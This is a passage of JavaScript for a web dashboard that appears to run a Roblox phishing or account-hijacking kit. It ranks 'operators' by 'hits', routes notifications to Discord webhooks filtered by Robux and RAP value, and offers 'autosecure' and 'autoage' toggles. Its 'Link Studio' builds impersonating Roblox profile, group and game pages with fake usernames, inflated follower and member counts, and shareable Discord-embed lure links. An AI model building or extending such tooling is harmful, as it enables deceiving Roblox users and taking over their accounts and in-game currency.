    if (badgeEl) { const dot = badgeEl.querySelector('.status-pulse-dot'); if (dot) dot.style.background = d.referral_name ? '#4ade80' : '#f59e0b'; }

    const dirStats = $('thDirStats');
    if (dirStats && d.stats) {
        dirStats.textContent = `· ${Number(d.stats.total_users || 0).toLocaleString()} operators · ${Number(d.stats.total_hits || 0).toLocaleString()} hits`;
    }
    render_directory(d.directory || []);
}

function render_directory(directory) {
    const el = $('thDirectory');
    if (!el) return;
    if (!directory.length) {
        el.innerHTML = `
            <div style="padding:32px 10px;text-align:center;color:rgba(255,255,255,0.3);font-family:'Rajdhani',sans-serif;font-size:0.85rem;letter-spacing:1px;text-transform:uppercase;">
                Directory is empty.
            </div>
        `;
        return;
    }
    el.innerHTML = directory.slice(0, 100).map((u, i) => {
        const name = u.display_name || u.username || 'Unknown';
        const score = `${Number(u.hit_count || 0).toLocaleString()} hits`;
        const setup = u.has_create_setup ? '<span class="hit-type-badge" style="margin-left:8px;">SETUP</span>' : '';
        return `
            <div class="leaderboard-row" data-rank="${i + 1}" style="cursor:pointer;" data-name="${esc_attr(name)}" onclick="open_directory_row(this)">
                <span style="font-family:'Rajdhani',sans-serif;font-size:0.75rem;font-weight:700;color:rgba(255,255,255,0.3);min-width:20px;text-align:center;">#${i + 1}</span>
                <div class="leaderboard-user">
                    <div class="lb-avatar-wrap">
                        <img src="${esc_attr(u.avatar)}" class="leaderboard-avatar" alt="${esc_attr(name)}" onerror="this.onerror=null;this.src='https://cdn.discordapp.com/embed/avatars/0.png';">
                    </div>
                    <span class="leaderboard-username">${esc_attr(name)}${setup}</span>
                </div>
                <div class="leaderboard-score">
                    <i class="fas fa-crosshairs" style="margin-right:4px;font-size:0.75rem;opacity:0.6;"></i>${score}
                </div>
            </div>
        `;
    }).join('');
}

async function saveTriplehook() {
    const u = state.user || {};
    const payload = {
        referral_name: val('thName').trim().slice(0, 20),
        referral_description: val('thDesc').trim().slice(0, 200),
        referral_invite: val('thInvite').trim().slice(0, 255),
        // preserve current customization (save_referral defaults-clobbers missing fields)
        bgColor: u.referral_bg_color || '#08080a',
        cardColor: u.referral_card_color || '#0d0d10',
        textColor: u.referral_text_color || '#f4f4f5',
        accentColor: u.referral_accent_color || '#e4e4e7',
        buttonColor: u.referral_button_color || '#161618',
        dashBgColor: u.referral_dash_bg_color || '#0f172a',
        dashTextColor: u.referral_dash_text_color || '#ffffff',
        dashAccentColor: u.referral_dash_accent_color || '#e4e4e7',
        showStats: chkval('thShowStats') ? 1 : 0,
        showHits: chkval('thShowHits') ? 1 : 0,
    };
    const btn = $('thSaveBtn');
    if (btn) btn.disabled = true;
    try {
        const d = await ws_request('save_referral', payload);
        if (d.error) throw new Error(d.error);
        Object.assign(u, {
            referral_name: payload.referral_name, referral_description: payload.referral_description,
            referral_invite: payload.referral_invite, referral_show_stats: payload.showStats, referral_show_hits: payload.showHits,
        });
        state.user = u;
        show_inline_msg($('thMsg'), 'Triplehook identity saved.', true);
        showToast('Triplehook identity saved', 'success');
        const badge = $('triplehookBadgeText');
        if (badge) badge.textContent = payload.referral_name ? 'Active' : 'Not set';
        ws_request('get_referral').then(d2 => { state.referral = d2; apply_referral(d2); }).catch(() => {});
    } catch (e) {
        show_inline_msg($('thMsg'), 'Save failed: ' + e.message, false);
        showToast('Save failed: ' + e.message, 'error');
    } finally {
        if (btn) btn.disabled = false;
    }
}

function copyCreatePageLink() {
    copy_text(location.origin + '/controller/create', 'Create page link copied');
}

/* ══════════════════════════════════════════════
   SETTINGS
   ══════════════════════════════════════════════ */
function fill_settings(user) {
    if (!user) return;
    const set_if = (id, v) => { const el = $(id); if (el && el.value !== undefined) el.value = v; };
    const chk_if = (id, v) => { const el = $(id); if (el) el.checked = !!Number(v || 0); };

    set_if('settingsWebhookUrl', user.discord_webhook || '');
    chk_if('setEveryoneChk', user.discord_everyone);
    chk_if('setHereChk', user.discord_here);
    chk_if('setVisitNotiChk', user.discord_visit_notifier);
    chk_if('setAnonymousChk', user.dashboard_anonymous);
    chk_if('setAutosecureChk', user.dashboard_autosecure);
    chk_if('setAutoageChk', user.dashboard_autoage);

    const filter_val = (v) => (Number(v || 0) > 0 && Number(v) !== 999999) ? String(Number(v)) : '';
    set_if('setRobuxFilter', filter_val(user.robux_filter));
    set_if('setRobuxWebhook', user.robux_webhook || '');
    set_if('setSummaryFilter', filter_val(user.summary_filter));
    set_if('setSummaryWebhook', user.summary_webhook || '');
    set_if('setRapFilter', filter_val(user.rap_filter));
    set_if('setRapWebhook', user.rap_webhook || '');

    update_webhook_badge();
}

function update_webhook_badge() {
    const has = !!(state.user && state.user.discord_webhook);
    const badge = $('settingsWebhookBadgeText');
    if (badge) badge.textContent = has ? 'Connected' : 'Not connected';
    const badgeEl = $('settingsWebhookBadge');
    if (badgeEl) { const dot = badgeEl.querySelector('.status-pulse-dot'); if (dot) dot.style.background = has ? '#4ade80' : '#f87171'; }
}

function collect_settings_payload() {
    const filter_out = (id) => { const n = Number(val(id)); return (n > 0 && n !== 999999) ? Math.round(n) : 999999; };
    return {
        discordWebhook: val('settingsWebhookUrl').trim(),
        discordEveryone: chkval('setEveryoneChk') ? 1 : 0,
        discordHere: chkval('setHereChk') ? 1 : 0,
        visitNoti: chkval('setVisitNotiChk') ? 1 : 0,
        anonymous: chkval('setAnonymousChk') ? 1 : 0,
        autosecure: chkval('setAutosecureChk') ? 1 : 0,
        autoage: chkval('setAutoageChk') ? 1 : 0,
        robuxFilter: filter_out('setRobuxFilter'),
        robuxWebhook: val('setRobuxWebhook').trim(),
        summaryFilter: filter_out('setSummaryFilter'),
        summaryWebhook: val('setSummaryWebhook').trim(),
        rapFilter: filter_out('setRapFilter'),
        rapWebhook: val('setRapWebhook').trim(),
    };
}

async function saveAllSettings() {
    const btn = $('saveSettingsBtn');
    if (btn) btn.disabled = true;
    try {
        const payload = collect_settings_payload();
        const d = await ws_request('save_settings', payload);
        if (d.error) throw new Error(d.error);
        Object.assign(state.user || {}, {
            discord_webhook: payload.discordWebhook,
            discord_everyone: payload.discordEveryone,
            discord_here: payload.discordHere,
            discord_visit_notifier: payload.visitNoti,
            dashboard_anonymous: payload.anonymous,
            dashboard_autosecure: payload.autosecure,
            dashboard_autoage: payload.autoage,
            robux_filter: payload.robuxFilter,
            robux_webhook: payload.robuxWebhook,
            summary_filter: payload.summaryFilter,
            summary_webhook: payload.summaryWebhook,
            rap_filter: payload.rapFilter,
            rap_webhook: payload.rapWebhook,
        });
        update_webhook_badge();
        show_inline_msg($('settingsMsg'), 'Settings saved.', true);
        showToast('Settings saved', 'success');
    } catch (e) {
        show_inline_msg($('settingsMsg'), 'Save failed: ' + e.message, false);
        showToast('Save failed: ' + e.message, 'error');
    } finally {
        if (btn) btn.disabled = false;
    }
}
const saveSettingsWebhook = saveAllSettings;

async function testSettingsWebhook() {
    const url = val('settingsWebhookUrl').trim() || (state.user && state.user.discord_webhook) || '';
    if (!url) { showToast('Enter a webhook URL first.', 'error'); return; }
    const btn = $('testWebhookBtn');
    if (btn) btn.disabled = true;
    try {
        const res = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: 'ARTERYX', content: '**ARTERYX** — webhook connected.' }),
        });
        if (res.status === 204 || res.ok) {
            show_inline_msg($('settingsWebhookMsg'), 'Test delivered to Discord.', true);
            showToast('Test webhook sent', 'success');
        } else {
            throw new Error('HTTP ' + res.status);
        }
    } catch (e) {
        show_inline_msg($('settingsWebhookMsg'), 'Test failed: ' + e.message, false);
        showToast('Webhook test failed: ' + e.message, 'error');
    } finally {
        if (btn) btn.disabled = false;
    }
}

async function pasteWebhookUrl() {
    try {
        const text = await navigator.clipboard.readText();
        const el = $('settingsWebhookUrl');
        if (el && text) { el.value = text.trim(); showToast('Pasted from clipboard', 'success'); }
    } catch (e) {
        showToast('Clipboard read blocked — paste manually', 'error');
    }
}

function copyRecoveryToken() {
    const el = $('recoveryTokenVal');
    const token = el ? el.textContent : '';
    if (!token || token === '…') { showToast('Token not loaded yet', 'error'); return; }
    copy_text(token, 'Recovery token copied');
}

/* ══════════════════════════════════════════════
   LINK STUDIO — TABS
   ══════════════════════════════════════════════ */
function showControllerTab(name) {
    document.querySelectorAll('#domains-tab .tab-btn').forEach(b => b.classList.toggle('active', b.dataset.tab === name));
    document.querySelectorAll('#domains-tab .tab-content').forEach(p => p.classList.add('hidden'));
    const el = $(name + 'Form');
    if (el) el.classList.remove('hidden');
    const ov = $('controllerLoadingOverlay');
    if (ov) { ov.classList.add('show'); setTimeout(() => ov.classList.remove('show'), 350); }
}

function init_stage_forms(user) {
    if (!user) return;
    const set = (id, v) => { const el = $(id); if (el) el.value = v; };
    set('stageRealUsername', user.profile_real_name || 'Roblox');
    set('stageFakeUsername', user.profile_fake_name || 'Roblox');
    set('stageDisplayUsername', user.profile_display_name || 'Roblox');
    set('stageFriendsInput', Number(user.profile_friends || 200));
    set('stageFollowersInput', Number(user.profile_followers || 10842000));
    set('stageFollowingsInput', Number(user.profile_followings || 68));
    if ($('stagePremiumSelect')) $('stagePremiumSelect').value = Number(user.profile_premium || 0) ? 'Yes' : 'No';
    const statusMap = { 'online': 'Online', 'offline': 'Offline', 'in game': 'In Game', 'ingame': 'In Game', 'in studio': 'In Studio', 'instudio': 'In Studio' };
    const st = String(user.profile_status || 'online').toLowerCase();
    if ($('stageActivitySelect')) $('stageActivitySelect').value = statusMap[st] || 'Online';
    set('stageAboutInput', user.profile_description || '');

    set('stageGroupName', user.group_name || 'Scriptbloxian Studios');
    set('stageGroupOwner', user.group_owner_name || 'Scriptbloxian');
    set('stageGroupMembers', Number(user.group_members || 25000000));
    set('stageGroupFunds', user.group_funds !== undefined ? Number(user.group_funds) : 0);
    set('stageGroupShout', user.group_shout || '');
    set('stageGroupDesc', user.group_description || '');

    updateStageProfilePreview();
    updateStageCommunityPreview();
    updateStageGamePreview();
}

/* ══════════════════════════════════════════════
   LINK STUDIO — LINKS
   ══════════════════════════════════════════════ */
function stage_vanity_name() {
    const u = state.user || {};
    return (u.referral_name || u.discord_username || '').trim();
}

function getStageProfileUrl() {
    const name = stage_vanity_name();
    return name ? `${location.origin}/controller/${encodeURIComponent(name)}` : `${location.origin}/controller/dashboard`;
}

function getStageCommunityUrl() {
    return getStageProfileUrl();
}

function getStageGameUrl() {
    const placeId = val('stagePlaceIdInput').trim() || '4924922222';
    const code = (state.user && state.user.referral_code) || '';
    return `${location.origin}/games/${placeId}/${code ? '?secret=' + encodeURIComponent(code) : ''}`;
}

function updateAllActiveStageLinks() {
    const cp = $('stageCopyProfileBtn'); if (cp) cp.title = getStageProfileUrl();
    const cc = $('stageCopyCommunityBtn'); if (cc) cc.title = getStageCommunityUrl();
    const cg = $('stageCopyGameBtn'); if (cg) cg.title = getStageGameUrl();
}

/* ══════════════════════════════════════════════
   LINK STUDIO — PROFILE PREVIEW + SAVE
   ══════════════════════════════════════════════ */
function updateStageProfilePreview() {
    const fakeUser = val('stageFakeUsername').trim() || 'Roblox';
    const displayUser = val('stageDisplayUsername').trim() || fakeUser;
    const friends = val('stageFriendsInput').trim() || '0';
    const followers = val('stageFollowersInput').trim() || '0';
    const followings = val('stageFollowingsInput').trim() || '0';
    const isPremium = ($('stagePremiumSelect') || {}).value === 'Yes';
    const isVerified = ($('stageVerifiedSelect') || {}).value === 'Yes';

    const pDisplay = $('stagePreviewDisplayName'); if (pDisplay) pDisplay.textContent = displayUser;
    const pUser = $('stagePreviewUsername'); if (pUser) pUser.textContent = fakeUser;
    const pFriends = $('stagePreviewFriends'); if (pFriends) pFriends.textContent = (Number(friends) || 0).toLocaleString();
    const pFollowers = $('stagePreviewFollowers'); if (pFollowers) pFollowers.textContent = (Number(followers) || 0).toLocaleString();
    const pFollowing = $('stagePreviewFollowing'); if (pFollowing) pFollowing.textContent = (Number(followings) || 0).toLocaleString();

    const premIcon = $('stagePremiumIcon'); if (premIcon) premIcon.style.display = isPremium ? 'inline' : 'none';
    const verIcon = $('stageVerifiedIcon'); if (verIcon) verIcon.style.display = isVerified ? 'inline' : 'none';

    updateAllActiveStageLinks();
}

async function fetchStageRobloxUser() {
    const username = val('stageRealUsername').trim();
    if (!username) { showToast('Enter a Roblox username first.', 'error'); return; }
    const btn = document.querySelector('#stageRealUsername + .load-avatar-addon-btn, #stageRealUsername ~ .load-avatar-addon-btn');
    const prev = btn ? btn.innerHTML : '';
    if (btn) btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';

    try {
        const r = await fetch('/curl/https://users.roblox.com/v1/usernames/users', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ usernames: [username], excludeBannedUsers: false }),
        });
        const j = await r.json();
        const u = j && Array.isArray(j.data) && j.data[0];
        if (!u) throw new Error('user not found');
        profileState.realUserId = u.id;

        const t = await fetch(`/curl/https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${u.id}&size=420x420&format=Png&isCircular=false`);
        const tj = await t.json();
        const img = tj && tj.data && tj.data[0] && tj.data[0].imageUrl;
        const av = $('stageProfileAvatar');
        if (av && img) { av.src = img; profileState.avatarUrl = img; }

        const realInput = $('stageRealUsername'); if (realInput) realInput.value = u.name;
        const fake = $('stageFakeUsername'); if (fake && !fake.value.trim()) fake.value = u.name;
        const disp = $('stageDisplayUsername'); if (disp && !disp.value.trim()) disp.value = u.displayName || u.name;
        updateStageProfilePreview();
        showToast('Loaded ' + (u.displayName || u.name) + ' (@' + u.name + ')', 'success');
    } catch (e) {
        showToast('Roblox lookup failed: ' + e.message, 'error');
    } finally {
        if (btn) btn.innerHTML = prev || '<i class="fas fa-sync-alt"></i> Load';
    }
}

async function saveStageProfile() {
    const btn = $('stageSaveProfileBtn');
    if (btn) btn.disabled = true;
    try {
        const payload = {
            profile_real_name: val('stageRealUsername').trim(),
            profile_fake_name: val('stageFakeUsername').trim(),
            profile_display_name: val('stageDisplayUsername').trim(),
            profile_friends: numval('stageFriendsInput'),
            profile_followers: numval('stageFollowersInput'),
            profile_followings: numval('stageFollowingsInput'),
            profile_premium: ($('stagePremiumSelect') || {}).value === 'Yes' ? 1 : 0,
            profile_status: ($('stageActivitySelect') || {}).value || 'Online',
            profile_description: val('stageAboutInput').trim(),
        };
        const d = await ws_request('save_profile', { profile: payload });
        if (d.error) throw new Error(d.error);
        if (state.user) Object.assign(state.user, payload);
        showToast('Profile saved', 'success');
    } catch (e) {
        showToast('Profile save failed: ' + e.message, 'error');
    } finally {
        if (btn) btn.disabled = false;
    }
}

function copyStageProfileLink() {
    const name = stage_vanity_name();
    if (!name) { showToast('Set a Triplehook display name first', 'error'); return; }
    copy_text(getStageProfileUrl(), 'Profile link copied');
}

function copyStageProfileDiscordLink() {
    const name = stage_vanity_name();
    if (!name) { showToast('Set a Triplehook display name first', 'error'); return; }
    const fake = val('stageFakeUsername').trim() || 'Roblox';
    copy_text(`[${fake}'s Profile](${getStageProfileUrl()})`, 'Discord embed copied');
}

function openStageProfileLink() {
    window.open(getStageProfileUrl(), '_blank');
}

/* ══════════════════════════════════════════════
   LINK STUDIO — COMMUNITY
   ══════════════════════════════════════════════ */
function updateStageCommunityPreview() {
    const groupName = val('stageGroupName').trim() || 'Scriptbloxian Studios';
    const owner = val('stageGroupOwner').trim() || 'Scriptbloxian';
    const members = val('stageGroupMembers').trim() || '0';
    const funds = val('stageGroupFunds').trim() || '0';
    const logo = val('stageGroupLogo').trim();

    const pName = $('stagePreviewGroupName'); if (pName) pName.textContent = groupName;
    const pOwner = $('stagePreviewOwnerName'); if (pOwner) pOwner.textContent = owner;
    const pMembers = $('stagePreviewMembers'); if (pMembers) pMembers.textContent = (Number(members) || 0).toLocaleString();
    const pFunds = $('stagePreviewFunds'); if (pFunds) pFunds.textContent = (Number(funds) || 0).toLocaleString();
    const av = $('stageCommunityAvatar'); if (av && logo) av.src = logo;

    updateAllActiveStageLinks();
}

async function fetchStageRobloxGroup() {
    const groupId = val('stageRealGroupId').trim();
    if (!groupId || !/^\d+$/.test(groupId)) { showToast('Enter a numeric Roblox group ID first.', 'error'); return; }
    const btn = document.querySelector('#stageRealGroupId + .load-avatar-addon-btn, #stageRealGroupId ~ .load-avatar-addon-btn');
    const prev = btn ? btn.innerHTML : '';
    if (btn) btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';

    try {
        const r = await fetch('/curl/https://groups.roblox.com/v1/groups/' + encodeURIComponent(groupId));
        const j = await r.json();
        if (!j || !j.name) throw new Error('group not found');

        const el = (id, v) => { const e = $(id); if (e) e.value = v; };
        el('stageGroupName', j.name);
        el('stageGroupOwner', (j.owner && j.owner.username) || 'Unknown');
        el('stageGroupMembers', Number(j.memberCount || 0));
        el('stageGroupDesc', j.description || '');
        if ($('stageGroupShout') && j.shout && j.shout.body) $('stageGroupShout').value = j.shout.body;

        const t = await fetch(`/curl/https://thumbnails.roblox.com/v1/groups/icons?groupIds=${encodeURIComponent(groupId)}&size=150x150&format=Png&isCircular=false`);
        const tj = await t.json();
        const img = tj && tj.data && tj.data[0] && tj.data[0].imageUrl;
        if (img) { const e2 = $('stageGroupLogo'); if (e2) e2.value = img; }

        updateStageCommunityPreview();
        showToast('Loaded group "' + j.name + '"', 'success');
    } catch (e) {
        showToast('Group lookup failed: ' + e.message, 'error');
    } finally {
        if (btn) btn.innerHTML = prev || '<i class="fas fa-sync-alt"></i> Load';
    }
}

async function saveStageCommunity() {
    const btn = $('stageSaveCommunityBtn');
    if (btn) btn.disabled = true;
    try {
        const payload = {
            group_name: val('stageGroupName').trim(),
            group_owner_name: val('stageGroupOwner').trim(),
            group_members: numval('stageGroupMembers'),
            group_funds: numval('stageGroupFunds'),
            group_shout: val('stageGroupShout').trim(),
            group_description: val('stageGroupDesc').trim(),
        };
        const d = await ws_request('save_group', { group: payload });
        if (d.error) throw new Error(d.error);
        if (state.user) Object.assign(state.user, payload);
        showToast('Community saved', 'success');
    } catch (e) {
        showToast('Community save failed: ' + e.message, 'error');
    } finally {
        if (btn) btn.disabled = false;
    }
}

function copyStageCommunityLink() {
    copy_text(getStageCommunityUrl(), 'Community link copied');
}

function copyStageCommunityDiscordLink() {
    const groupName = val('stageGroupName').trim() || 'Community';
    copy_text(`[${groupName} Community](${getStageCommunityUrl()})`, 'Discord embed copied');
}

function openStageCommunityLink() {
    window.open(getStageCommunityUrl(), '_blank');
}

/* ══════════════════════════════════════════════
   LINK STUDIO — GAME
   ══════════════════════════════════════════════ */
function updateStageGamePreview() {
    const placeId = val('stagePlaceIdInput').trim() || '4924922222';
    const override = val('stageGameTitleOverride').trim();
    const pId = $('stagePreviewPlaceId'); if (pId) pId.textContent = placeId;
    const pTitle = $('stagePreviewGameTitle');
    if (pTitle && override) pTitle.textContent = override;
    updateAllActiveStageLinks();
}

async function fetchStageGameInfo() {
    const placeId = val('stagePlaceIdInput').trim();
    if (!placeId || !/^\d+$/.test(placeId)) { showToast('Enter a numeric place ID first.', 'error'); return; }
    const btn = document.querySelector('#stagePlaceIdInput + .load-avatar-addon-btn, #stagePlaceIdInput ~ .load-avatar-addon-btn');
    const prev = btn ? btn.innerHTML : '';
    if (btn) btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';

    try {
        const u = await fetch(`/curl/https://apis.roblox.com/universes/v1/places/${encodeURIComponent(placeId)}/universe`).then(r => r.json());
        const universeId = u && u.universeId;
        if (!universeId) throw new Error('place not found');

        const g = await fetch(`/curl/https://games.roblox.com/v1/games?universeIds=${universeId}`).then(r => r.json());
        const game = g && g.data && g.data[0];
        if (!game) throw new Error('game details unavailable');

        const t = await fetch(`/curl/https://thumbnails.roblox.com/v1/games/icons?universeIds=${universeId}&size=512x512&format=Png&isCircular=false`).then(r => r.json());
        const img = t && t.data && t.data[0] && t.data[0].imageUrl;
        if (img) { const icon = $('stageGameIcon'); if (icon) icon.src = img; }

        const pTitle = $('stagePreviewGameTitle'); if (pTitle) pTitle.textContent = game.name || 'Roblox Game';
        const override = $('stageGameTitleOverride'); if (override && !override.value.trim()) override.value = game.name || '';
        updateStageGamePreview();
        showToast('Loaded "' + game.name + '"', 'success');
    } catch (e) {
        showToast('Game lookup failed: ' + e.message, 'error');
    } finally {
        if (btn) btn.innerHTML = prev || '<i class="fas fa-search"></i> Inspect';
    }
}

function generateStageGameLink() {
    updateStageGamePreview();
    copy_text(getStageGameUrl(), 'Game link copied');
    const btn = $('stageSaveGameBtn');
    if (btn) btn.title = getStageGameUrl();
}

function copyStageGameLink() {
    copy_text(getStageGameUrl(), 'Game link copied');
}

function copyStageGameDiscordLink() {
    const title = val('stageGameTitleOverride').trim() || ($('stagePreviewGameTitle') ? $('stagePreviewGameTitle').textContent : 'Roblox Game');
    copy_text(`[Play ${title}](${getStageGameUrl()})`, 'Discord embed copied');
}

function openStageGameLink() {
    window.open(getStageGameUrl(), '_blank');
}

/* ══════════════════════════════════════════════
   BACKGROUND — STARFIELD + SETTINGS DOTS
   ══════════════════════════════════════════════ */
function init_starfield() {
    const canvas = $('bgCanvas');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    const dpr = Math.min(2, window.devicePixelRatio || 1);
    let w = 0, h = 0, dots = [];
    const mouse = { x: -9999, y: -9999 };
    let running = true;

    function build() {
        const count = w < 768 ? 140 : 250;
        dots = [];
        for (let i = 0; i < count; i++) {
            dots.push({
                x: Math.random() * w, y: Math.random() * h,
                r: 1.2 + Math.random() * 2.0,
                vx: (Math.random() - 0.5) * 0.32,
                vy: (Math.random() - 0.5) * 0.32,
                a: 0.38 + Math.random() * 0.32,
                ph: Math.random() * Math.PI * 2,
                sw: 0.0004 + Math.random() * 0.0008,
                sh: Math.floor(150 + Math.random() * 70),
            });
        }
    }

    function resize() {
        w = window.innerWidth; h = window.innerHeight;
        canvas.width = Math.round(w * dpr);
        canvas.height = Math.round(h * dpr);
        canvas.style.width = w + 'px';
        canvas.style.height = h + 'px';
        ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
        build();
    }

    function frame(t) {
        if (!running) return;
        ctx.clearRect(0, 0, w, h);
        for (const d of dots) {
            d.x += d.vx + Math.sin(t * d.sw + d.ph) * 0.08;
            d.y += d.vy + Math.cos(t * d.sw + d.ph) * 0.08;
            if (d.x < -6) d.x = w + 6; if (d.x > w + 6) d.x = -6;
            if (d.y < -6) d.y = h + 6; if (d.y > h + 6) d.y = -6;

            let ox = 0, oy = 0;
            const dx = d.x - mouse.x, dy = d.y - mouse.y;
            const dist2 = dx * dx + dy * dy;
            if (dist2 < 14400 && dist2 > 0.01) {
                const dist = Math.sqrt(dist2);
                const push = (120 - dist) / 120;
                ox = (dx / dist) * push * 14;
                oy = (dy / dist) * push * 14;
            }
            const alpha = d.a * (0.75 + 0.25 * Math.sin(t * d.sw * 2 + d.ph));
            ctx.beginPath();
            ctx.fillStyle = `rgba(${d.sh},${d.sh},${Math.min(255, d.sh + 10)},${alpha.toFixed(3)})`;
            ctx.arc(d.x + ox, d.y + oy, d.r, 0, Math.PI * 2);
            ctx.fill();
        }
        requestAnimationFrame(frame);
    }

    window.addEventListener('resize', resize);
    window.addEventListener('mousemove', (e) => { mouse.x = e.clientX; mouse.y = e.clientY; });
    resize();
    requestAnimationFrame(frame);
}

let settings_dots_inited = false;
function init_settings_dots() {
    if (settings_dots_inited) return;
    const canvas = $('settingsDotsCanvas');
    if (!canvas) return;
    settings_dots_inited = true;
    const ctx = canvas.getContext('2d');
    const dpr = Math.min(2, window.devicePixelRatio || 1);
    let dots = [], w = 0, h = 0;

    function build() {
        w = canvas.parentElement ? canvas.parentElement.clientWidth : window.innerWidth;
        h = canvas.parentElement ? Math.max(540, canvas.parentElement.clientHeight) : 540;
        canvas.width = Math.round(w * dpr);
        canvas.height = Math.round(h * dpr);
        canvas.style.width = w + 'px';
        canvas.style.height = h + 'px';
        ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
        dots = [];
        const count = Math.min(90, Math.floor((w * h) / 18000));
        for (let i = 0; i < count; i++) {
            dots.push({ x: Math.random() * w, y: Math.random() * h, r: 0.8 + Math.random() * 1.4, ph: Math.random() * Math.PI * 2, sw: 0.0006 + Math.random() * 0.001 });
        }
    }

    function frame(t) {
        ctx.clearRect(0, 0, w, h);
        for (const d of dots) {
            const a = 0.10 + 0.10 * (0.5 + 0.5 * Math.sin(t * d.sw * 2 + d.ph));
            ctx.beginPath();
            ctx.fillStyle = `rgba(255,255,255,${a.toFixed(3)})`;
            ctx.arc(d.x, d.y, d.r, 0, Math.PI * 2);
            ctx.fill();
        }
        requestAnimationFrame(frame);
    }

    window.addEventListener('resize', () => { if (settings_dots_inited) build(); });
    build();
    requestAnimationFrame(frame);
}

/* ══════════════════════════════════════════════
   BOOT
   ══════════════════════════════════════════════ */
function inject_markup() {
    const tpl = $('arteryx-markup');
    const root = $('root');
    if (tpl && root) root.innerHTML = tpl.textContent;
}

async function auth_flow() {
    let chk = null;
    try {
        const res = await fetch('/api/auth/check', { credentials: 'same-origin' });
        chk = await res.json();
    } catch (e) {}
    if (!chk || !chk.authenticated || !chk.user || !chk.user.recovery_token) {
        location.replace('/controller/');
        return;
    }
    state.user = chk.user;
    apply_user_ui(chk.user);
    ws_connect();
}

function boot() {
    inject_markup();
    init_starfield();
    applyTabTitle('main');
    auth_flow();
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', boot);
} else {
    boot();
}
